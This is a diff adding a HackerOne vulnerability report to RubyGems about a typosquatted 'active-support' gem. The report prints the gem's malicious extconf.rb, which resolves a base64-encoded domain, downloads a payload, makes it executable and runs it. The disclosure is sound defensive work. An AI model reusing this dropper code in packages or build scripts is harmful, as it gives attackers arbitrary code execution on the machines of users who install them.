@@ -1,0 +1,138 @@
+{
+  "id": 392311,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zOTIzMTE=",
+  "url": "https://hackerone.com/reports/392311",
+  "title": "Malware in `active-support` gem",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-08-09T09:02:38.599Z",
+  "submitted_at": "2018-08-09T09:02:38.599Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "reed",
+    "url": "/reed",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8212,
+    "url": "https://hackerone.com/rubygems",
+    "handle": "rubygems",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/212/e65eca09896d23bc029c08d3147a79a48ec1ee2f_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "RubyGems",
+      "twitter_handle": "rubygems_status",
+      "website": "https://rubygems.org",
+      "about": "RubyGems.org is the Ruby community’s gem hosting service."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": true,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-3779"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-08-09T18:14:31.969Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-08-09T17:54:58.994Z",
+  "team_member_agreed_on_going_public_at": "2018-08-09T18:14:31.879Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "This was sent to RubySec:\n\nThe gem duplicates official `activesupport` (no hyphen) code, but adds a compiled extension. The extension attempts to resolve a base64 encoded domain (`29faea63.planfhntage.de`), downloads a payload, and executes.\n\nactive-support-5.2.0.gem/data/ext/trellislike/unflaming/waffling/extconf.rb\n\n```\nrequire 'net/http'\nrequire 'uri'\nrequire 'base64'\nrequire 'resolv'\n\nclass Smectis\n  def self.install_explot(weighership)\n    if !weighership.nil? and weighership != '0.0.0.0'\n      educable = Net::HTTP.get_response(URI('http://' + weighership + '/mimming'))\n      File.open('/tmp/autosymbiontic', 'wb+') do |uterometer|\n        uterometer.binmode\n        uterometer.write(educable.body)\n        uterometer.chmod(0777)\n        uterometer.close\n      end\n      system('/tmp/autosymbiontic')\n    end\n  end\n\n  def self.run()\n    milligram = 'MjlmYWVhNjMucGxhbmZobnRhZ2UuZGU='\n    jaunting = nil\n    begin\n      jaunting = Resolv.getaddress(Base64.decode64(milligram))\n    rescue\n    end\n    self.install_exploit(jaunting)\n  end\nend\n\nSmectis.run()\n```\n\n## Impact\n\nRun arbitrary code on a victim's machine.",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 330419,
+      "file_name": "active-support-5.2.0.gem",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/330/419/b8bb51497c7be9e9eff3f0b3651ab72c9384dc56/active-support-5.2.0.gem?response-content-disposition=attachment%3B%20filename%3D%22active-support-5.2.0.gem%22%3B%20filename%2A%3DUTF-8%27%27active-support-5.2.0.gem&response-content-type=application%2Fx-tar&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6Z4QMSVB%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T173052Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICsilB%2FXdbJD5xMwUTmgodcBJoF8dGOf12VeXpNyMy8ZAiBUj1qzkT4YnYrMYGtFV3ktazwDT6tmwZKWzOpXIGKBtSqxBQgYEAMaDDAxMzYxOTI3NDg0OSIMT8guq7dQ%2BZ9wtzS3Ko4FD4Fkc323gUkDSE2KV1R8DgTHOxnCadEPStSTSo5haKmG3i2Dc5eborHHq89LYUljo6ckVpKA2WftgM8cGNzzGDliNB0ylNqSNxLBHdWtrdfDWmm0wF3uf7%2B3r%2BmUAU4KOL6O8wiPlMV6j2jbluA6clYWWe%2BNONoHA%2F74j0SSST%2BKbB1KKnREYF960ul4ekHndISYKFMdDPsMKKDO6hlWhK%2Fbg4HrcVRnCjb1faDlYP8%2F4l64xuefar2OnDEwXg8WLKG8NoPxMcGbhsdSkgKVL6xqURO47yY5SmSmXRXi0j%2FwMgMNSP8VHN%2BWcPMXXxMBkAhRXKGVEA9b2q461PdRX6J5FQvj5%2BYzKhW4C%2FvdAWAi4vrbDSF11D%2FFVbCPedHdHDZwJwFF26KezxXl%2B%2B1NZGHweUpLOg3j8EF1AG7X17z4RyCXJwR9BXlORCv5VnxczANyxcf73Uq5zCTx6wG1XQVJSuUX%2F57GK8sLbocH0MYCN8eF9yRoDvEPUCmes2DT%2FEJ3sUpLXG1SLmXqzWVlVN0u7WFaMfcNBaq2r%2B3qBAdwlAboGROxLi%2Br98jrWBpHf%2BufDI%2BM6pbiO4Ziy%2FL%2FZ2KYtV4PCjYX1PPuX0gGf%2Fm%2F%2FpKliQOtWsjAZoy0YUZVdNEJU6sgvmmCoZGwHhb8L1co%2Bt%2FafUCfGpI2CA%2B0fJbMA2c9PazU1xWoPk87Lo%2FvIUzWFroV%2BJvosBZG%2BJdExxdYYUZbXm%2FvDWGPIjpoy9LMRt5PunmQIKc1uL61ou8yPVWBH50Imud42qUVgmUhpP6pzNqApAp1uuSeU1GZYYAT67gp%2FBCdPuS%2BrN8JyfcN0E9IaGTC5jOWmIrW2auPkHJ%2BKKScWM84WtO77ktiMMqYwMYGOrIBDTzRSOA48T%2BXsJoDTRtDWSAZCx%2Bp1gKZGrwLeKDirdmMD6IpWd05RhHYRvMbCqqp7Ce0Zb8lBJ2bgxuK4cixmqAKEHW90W2GEJTOCplVG%2Fm%2BxTjrHDBTtYuLttogej5eDRq4kcRnqAaMShOlNnwvKRGAgPEk2dG%2BXJ0fu4EhLO6aBHvEHG8Ri1IJ9KEHhYvOsjhnlQ3FdA0gaPCbeuBU2voiUXZXWQf5t%2BkQgxynfQyJyQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f9882aaa32a0e05266d2cc41c507b37365842201e42a22bed833c8008672c203",
+      "file_size": 381952,
+      "type": "application/x-tar",
+      "moderated": null
+    },
+    {
+      "id": 330420,
+      "file_name": "extconf.rb",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/330/420/4ccc7ef75fa262781b61b920beceb97abc7e4177/extconf.rb?response-content-disposition=attachment%3B%20filename%3D%22extconf.rb%22%3B%20filename%2A%3DUTF-8%27%27extconf.rb&response-content-type=text%2Fx-c%2B%2B&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6Z4QMSVB%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T173052Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICsilB%2FXdbJD5xMwUTmgodcBJoF8dGOf12VeXpNyMy8ZAiBUj1qzkT4YnYrMYGtFV3ktazwDT6tmwZKWzOpXIGKBtSqxBQgYEAMaDDAxMzYxOTI3NDg0OSIMT8guq7dQ%2BZ9wtzS3Ko4FD4Fkc323gUkDSE2KV1R8DgTHOxnCadEPStSTSo5haKmG3i2Dc5eborHHq89LYUljo6ckVpKA2WftgM8cGNzzGDliNB0ylNqSNxLBHdWtrdfDWmm0wF3uf7%2B3r%2BmUAU4KOL6O8wiPlMV6j2jbluA6clYWWe%2BNONoHA%2F74j0SSST%2BKbB1KKnREYF960ul4ekHndISYKFMdDPsMKKDO6hlWhK%2Fbg4HrcVRnCjb1faDlYP8%2F4l64xuefar2OnDEwXg8WLKG8NoPxMcGbhsdSkgKVL6xqURO47yY5SmSmXRXi0j%2FwMgMNSP8VHN%2BWcPMXXxMBkAhRXKGVEA9b2q461PdRX6J5FQvj5%2BYzKhW4C%2FvdAWAi4vrbDSF11D%2FFVbCPedHdHDZwJwFF26KezxXl%2B%2B1NZGHweUpLOg3j8EF1AG7X17z4RyCXJwR9BXlORCv5VnxczANyxcf73Uq5zCTx6wG1XQVJSuUX%2F57GK8sLbocH0MYCN8eF9yRoDvEPUCmes2DT%2FEJ3sUpLXG1SLmXqzWVlVN0u7WFaMfcNBaq2r%2B3qBAdwlAboGROxLi%2Br98jrWBpHf%2BufDI%2BM6pbiO4Ziy%2FL%2FZ2KYtV4PCjYX1PPuX0gGf%2Fm%2F%2FpKliQOtWsjAZoy0YUZVdNEJU6sgvmmCoZGwHhb8L1co%2Bt%2FafUCfGpI2CA%2B0fJbMA2c9PazU1xWoPk87Lo%2FvIUzWFroV%2BJvosBZG%2BJdExxdYYUZbXm%2FvDWGPIjpoy9LMRt5PunmQIKc1uL61ou8yPVWBH50Imud42qUVgmUhpP6pzNqApAp1uuSeU1GZYYAT67gp%2FBCdPuS%2BrN8JyfcN0E9IaGTC5jOWmIrW2auPkHJ%2BKKScWM84WtO77ktiMMqYwMYGOrIBDTzRSOA48T%2BXsJoDTRtDWSAZCx%2Bp1gKZGrwLeKDirdmMD6IpWd05RhHYRvMbCqqp7Ce0Zb8lBJ2bgxuK4cixmqAKEHW90W2GEJTOCplVG%2Fm%2BxTjrHDBTtYuLttogej5eDRq4kcRnqAaMShOlNnwvKRGAgPEk2dG%2BXJ0fu4EhLO6aBHvEHG8Ri1IJ9KEHhYvOsjhnlQ3FdA0gaPCbeuBU2voiUXZXWQf5t%2BkQgxynfQyJyQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=25462d43a334a4258be306c1123b3654a8230416edab3badfb2755f36173aa17",
+      "file_size": 774,
+      "type": "text/x-c++",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-09-08T17:54:59.100Z",
+  "allow_singular_disclosure_after": -222046553.58104634,
+  "singular_disclosure_allowed": true,
+  "vote_count": 8,
+  "voters": [
+    "mashoud1122",
+    "kapytein",
+    "ali",
+    "sameerphad72",
+    "reed",
+    "sa1tama0",
+    "japz",
+    "cryptographer"
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 2042,
+    "asset_type": "URL",
+    "asset_identifier": "rubygems.org",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
